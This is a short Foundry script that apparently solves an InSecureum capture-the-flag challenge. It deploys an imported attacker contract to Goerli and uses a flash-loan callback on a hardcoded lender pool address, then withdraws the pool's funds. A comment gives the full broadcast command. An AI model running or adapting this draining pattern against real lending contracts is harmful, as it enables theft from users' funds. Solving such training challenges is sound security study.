// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {InSecureumLenderPoolHacker} from "../test/Challenge1.t.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";

//Execute
//forge script script/Challenge1.s.sol:Challenge1Script --rpc-url $GOERLI_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
   
contract Challenge1Script is Script {
    function setUp() public {}

    function run() public {

        console.log("####1");
        vm.startBroadcast();
        console.log(msg.sender);

        InSecureumLenderPool target = InSecureumLenderPool(0x944A4500a4747Cb3A8F5D419F40CFd5dB522E25d);
        InSecureumLenderPoolHacker hacker = new InSecureumLenderPoolHacker();

        console.log("####2");
        target.flashLoan(
          address(hacker),
          abi.encodeWithSignature(
            "receiveFlashLoan(address)", address(hacker)
          )
        );
        
        hacker.withdrawFunds(address(target));
        
        console.log("####3");
        vm.stopBroadcast();
        
        console.log("####5");

    }
}
